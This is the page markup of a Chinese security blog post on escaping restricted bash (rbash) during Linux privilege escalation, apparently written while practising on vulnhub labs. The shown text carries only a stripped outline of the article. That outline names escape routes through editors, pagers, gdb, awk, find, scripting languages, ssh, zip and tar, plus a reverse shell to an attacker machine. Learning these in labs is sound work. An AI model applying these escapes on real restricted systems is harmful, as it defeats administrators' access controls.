<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>Linux提权学习之rbash逃逸 | hybcx</title><meta name="keywords" content="Linux提权"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="Linux提权学习之rbash逃逸"><meta name="application-name" content="Linux提权学习之rbash逃逸"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="Linux提权学习之rbash逃逸"><meta property="og:url" content="http://hybcx.xyz/2024/07/20/linux-ti-quan-xue-xi-yi/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="0x01 前言 本文的产生也是在刷vulnhub靶场的时候遇到的，由于自身太菜，因此可以看到本文的知识都是cv的┭┮﹏┭┮，自己的想法很少的，也就实操那一部分会跟着做做，还请见谅~~ 0x02 rbash简述 1、什么是rbash 它与一般shell的区别在于会限制一些行为，让一些命令无法执行 2、"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="0x01 前言 本文的产生也是在刷vulnhub靶场的时候遇到的，由于自身太菜，因此可以看到本文的知识都是cv的┭┮﹏┭┮，自己的想法很少的，也就实操那一部分会跟着做做，还请见谅~~ 0x02 rbash简述 1、什么是rbash 它与一般shell的区别在于会限制一些行为，让一些命令无法执行 2、"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2024/07/20/linux-ti-quan-xue-xi-yi/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: {"appId":"Z7A3XW4R2I","apiKey":"12db1ad54372045549ef465881c17e743","indexName":"my-hexo-blog","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: 'Linux提权学习之rbash逃逸',
  postAI: '',
  pageFillDescription: '0x01 前言, 0x02 rbash简述, 1、什么是rbash, 2、如何设置一个rbash, 3、使用场景, 0x03 信息搜集, 0x04 常用逃逸命令, 4.1 如果允许使用/, 4.2 如果允许使用cp命令, 4.3 使用ftp进行命令执行, 4.4 使用gdb进行命令执行, 4.5 使用more/man/less进行命令执行, 4.6 使用vim进行命令执行, 4.7 使用rvim执行python, 4.8 使用scp传入自己的脚本, 4.9 使用awk命令执行, 4.10 使用find执行命令, 4.11 补充, 1、cp /bin/bash到本地用户目录, 2、set shell, 3、更改PATH或SHELL环境变量, 0x05 编程语言逃逸, 5.1 Python, 5.2 PHP, 5.3 perl, 5.4 lua, 5.5 Ruby, 5.6 except, 0x06 高级技术, 6.1 ssh, 6.2 zip, 6.3 tar, 6.4 pico, 6.5 环境变量修复, 0x07 简单实战, 7.1 创建测试用户, 7.1.1 为新用户建立目录, 7.1.2 指定用户可以运行的命令, 7.2 rbash逃逸, 7.2.1 切换用户时逃逸, 7.2.2 ssh登录时逃逸, 7.2.3 当前shell中逃逸, 7.2.3.1 特殊情况, 7.2.4 利用系统常见应用逃逸, 7.2.5 利用用户安装应用逃逸, 1、ed-editor, 2、git, 3、zip, 4、tar, 7.2.6 利用编程语言环境绕过, 1、python, 2、php, 3、perl, 4、lua, 5、ruby, 6、expect, 0x08 tips, 0x09 总结, 0x10 参考文章前言本文的产生也是在刷靶场的时候遇到的由于自身太菜因此可以看到本文的知识都是的自己的想法很少的也就实操那一部分会跟着做做还请见谅简述什么是它与一般的区别在于会限制一些行为让一些命令无法执行如何设置一个复制一个重命名为设置用户登陆的为在用户下新建一个目录存放可以执行的命令使用场景是一种限制命令如等阻止环境变量如甚至于阻止管道重定向如的常见的有有如下场景使用提高系统安全性阻止黑客执行高危命令系统管理员创建受限制进而防止普通用户执行危险命令部分赛题如信息搜集这里我们主要是通过信息搜集来确定当下的环境下可以执行那些命令以及环境信息检查可用的命令如等检查运算符如等检查可用的编程语言如等哪些命令可以作为运行检查具有权限的文件或命令检查当前使用的检查环境变量运行等通过以上操作我们已收集到一些有用的信息接下来尝试一下通用的利用方法常用逃逸命令如果允许使用则可以运行如果允许使用命令则可以复制或者到当前目录使用进行命令执行执行使用进行命令执行执行使用进行命令执行执行使用进行命令执行执行使用执行然后运行使用通过来传入自己脚本使用执行使用执行如果允许使用则可以运行如果允许使用命令则可以复制到当前目录不过这里我没有复现成功应该是环境条件不允许吧下面有补充使用进行命令执行执行如上图所示的命令使用进行命令执行执行不过前提就是该环境下有环境使用进行命令执行执行这里那些文章介绍的不清楚我复现了一下发现还是需要某种条件也就是你当前目录下有足够大的内容的文本这样读取的时候才会体现出分页读取的效果进而你可以直接输入如图不必非得读取内容多的文件似乎直接输入即可使用进行命令执行执行使用执行这里不知为何提示我在中无法执行命令禁止使用命令但也可能是我不会操作吧使用传入自己的脚本这里未复现目标机器连接利用将下载到靶机上来靶机上执行用户名和是的上执行用户名和是靶机的涉及到的提权方式拿到一个本地普通用户后往往先要在该用户的家目录下搜索一番以寻找有用的信息提权的时候几乎所有的文件操作都在目录下因为其他目录往往没有权限所以要时刻注意自己当前所在的目录发现具有权限的命令使用命令执行执行不过这里更推荐使用一种我这个环境不知为何使用不了估计是我之前修改了吧使用执行命令这里也是使用其中一个这里看了几篇文章我再补充一下上述的命令补充到本地用户目录切换到了切换到了执行这里说也可但我没有找到方法靶机使用它成功了在一些编辑器中可以设置变量然后执行如中进入之后或者用切换完成之后还要添加环境变量给变量增加两个路径用来查找命令更改或环境变量执行查看系统的环境变量设置和变量的权限设置很可能是这就意味着我们只能执行和读取不能写入如果有权限的话我们可以直接给它写入编程语言逃逸或者不过这些编程语言的用法未曾复现我发现在上输入的时候没反应估计是环境不匹配吧暂作记录高级技术执行然后写入并且执行这里复现了一波步骤为直接输入然后按会让你编写文件名文件名随意写接着按然后执行你想要的命令如等等即可环境变量修复获取到的环境变量可能会缺失在这里可以通过如下命令进行修复简单实战创建测试用户使用具有特权的用户创建一个新测试用户创建一个用户名为并且设置登录为为设置密码这里密码为为新用户建立目录指定用户可以运行的命令为用户指定可以运行的命令创建指向新建目录链接指定用户可以运行从创建一个名为的符号链接逃逸切换用户时逃逸这里的原理涉及到和的区别命令只会更改当前用户而不会更改当前的用户环境比如你从用户到账户中当前路径仍是你刚才的路径环境变量仍是用户的命令则在更改当前用户信息的同时还会更改用户环境但是假如你从用户到账户你会发现你的当前路径已经变为环境变量也变了逃逸这里我并未复现成功就先看个图吧登录时逃逸借助远程在远程机器上运行脚本当前中逃逸特殊情况被允许的情况下直接或能够设置或时权限足够时或利用系统常见应用逃逸以上在输入的地方输入或利用用户安装应用逃逸利用编程语言环境绕过这里也是解密了原来是在真实情况下才可以这里仍未复现成功它提示我语法错误不理解使用反弹设绕过攻击机开启监听目标机建立连接同估计真是语法问题比更容易遇到的问题是当前路径异常问题一般很多命令基础执行不了的时候都是路径异常查看该值可验证修复不能使用等字符重定向写文件切换用户逃逸时还可以在切换用户时执行命令登录时同样可以通过逃逸编程语言绕过的利用还可以使用反弹到我们攻击机的方式进行逃逸以为例上边用的比较多的是和其实还有一个由于没有了有时候能够达到很好的绕过效果同理在路径正确的情况下在当前中直接输入也能够完成逃逸和逃逸失败报错同总结这次也就是简单的演示了一下各种情况毕竟环境配置也很难很烦因此就草草了事只需要记得有这些姿势即可在实战时遇到问题在对应解决上述这些逃逸方式应用到其他类型的中也是可以的由于不同系统特性不同逃逸的方式也有很大差异再就是用户限制的宽松程度不同我们能够逃逸的方式也不同用户安装的等应用也能够给予很大的帮助总之就是要多尝试灵活应用参考文章安全绕过指南渗透技巧如何逃逸的受限制执行任意命令渗透测试逃逸方法简述逃逸大全绕过技巧建立环境可参考系列靶机知识点总结',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2024-08-05 18:34:05',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url">内网渗透</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/Linux%E6%8F%90%E6%9D%83/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>Linux提权</span></a></span></div></div><h1 class="post-title" itemprop="name headline">Linux提权学习之rbash逃逸</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-07-20T07:24:56.000Z" title="发表于 2024-07-20 15:24:56">2024-07-20</time><span 